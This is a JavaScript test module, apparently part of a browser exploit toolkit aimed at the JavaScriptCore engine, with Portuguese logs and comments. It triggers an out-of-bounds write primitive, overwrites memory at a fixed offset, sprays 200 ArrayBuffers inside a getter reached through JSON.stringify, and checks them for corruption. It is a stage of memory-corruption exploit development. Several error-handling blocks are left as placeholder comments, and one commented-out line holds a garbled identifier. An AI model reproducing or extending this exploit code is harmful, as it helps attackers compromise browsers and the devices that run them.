// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSprayTest";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

class CheckpointForSprayTest {
    constructor(id) {
        this.id_marker = `SprayTestCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "SprayTest_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado, executando spray e teste.", error: null, details: "" };

        let details_log = [];
        let sprayed_objects = [];
        const spray_count = 200;

        try {
            logS3("DENTRO DO GETTER: Iniciando spray de objetos com ArrayBuffer interno...", "info", FNAME_GETTER);
            for (let i = 0; i < spray_count; i++) {
                try {
                    let ab_inner = new ArrayBuffer(32);
                    new DataView(ab_inner).setUint32(0, 0x41410000 + i, true);
                    sprayed_objects.push({ id: i, inner_ab: ab_inner, marker: 0xBAD0000 + i });
                } catch (e_alloc) {
                    details_log.push(`Erro ao alocar objeto de spray ${i}: ${e_alloc.message}`);
                }
            }
            details_log.push(`Spray de ${sprayed_objects.length} objetos concluído.`);
            logS3(`DENTRO DO GETTER: Spray de ${sprayed_objects.length} objetos concluído. Verificando integridade...`, "info", FNAME_GETTER);

            let corruption_observed_in_spray = false;
            for (let i = 0; i < sprayed_objects.length; i++) {
                // const喷霧_obj = sprayed_objects[i]; // <--- LINHA COM ERRO
                const spray_obj = sprayed_objects[i]; // <--- CORRIGIDO AQUI
                if (!spray_obj || !spray_obj.inner_ab) continue;

                try {
                    if (!(spray_obj.inner_ab instanceof ArrayBuffer)) {
                        details_log.push(`Spray[${i}].inner_ab NÃO é ArrayBuffer! Tipo: ${Object.prototype.toString.call(spray_obj.inner_ab)}`);
                        corruption_observed_in_spray = true;
                        continue;
                    }
                    if (spray_obj.inner_ab.byteLength !== 32) {
                        details_log.push(`Spray[${i}].inner_ab.byteLength: ${spray_obj.inner_ab.byteLength} (Esperado 32)`);
                        corruption_observed_in_spray = true;
                    }
                    const dv = new DataView(spray_obj.inner_ab);
                    const val = dv.getUint32(0, true);
                    if (val !== (0x41410000 + i)) {
                        details_log.push(`Spray[${i}].inner_ab[0]: ${toHex(val)} (Esperado ${toHex(0x41410000 + i)})`);
                        corruption_observed_in_spray = true;
                    }
                } catch (e_check) {
                    details_log.push(`Erro ao verificar spray[${i}].inner_ab: ${e_check.message}`);
                    corruption_observed_in_spray = true;
                }
            }

            if (corruption_observed_in_spray) {
                current_test_results.success = true;
                current_test_results.message = "Corrupção observada em um ou mais ArrayBuffers pulverizados no getter!";
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
            } else {
                current_test_results.message = "Nenhuma corrupção óbvia nos ArrayBuffers pulverizados no getter.";
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "good", FNAME_GETTER);
            }

        } catch (e) {
            logS3(`DENTRO DO GETTER: ERRO GERAL: ${e.message}`, "error", FNAME_GETTER);
            current_test_results.error = String(e);
            current_test_results.message = `Erro geral no getter: ${e.message}`;
        }
        current_test_results.details = details_log.join('; ');
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForSprayTest.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_spray_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeSprayTestInGetter"; // Nome interno
    logS3(`--- Iniciando Teste de Spray e Verificação no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);

        const checkpoint_obj_for_spray = new CheckpointForSprayTest(1);
        logS3(`CheckpointForSprayTest objeto criado. ID: ${checkpoint_obj_for_spray.id_marker}`, "info", FNAME_TEST);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj_for_spray)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj_for_spray);
        } catch (e) { /* ... erro ... */ }

    } catch (mainError) { /* ... erro principal ... */ }
    finally { /* ... limpeza ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE SPRAY: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE SPRAY: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da inspeção do spray: ${current_test_results.details}`, "info", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE SPRAY: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste de Spray e Verificação no Getter Concluído ---`, "test", FNAME_TEST);
}
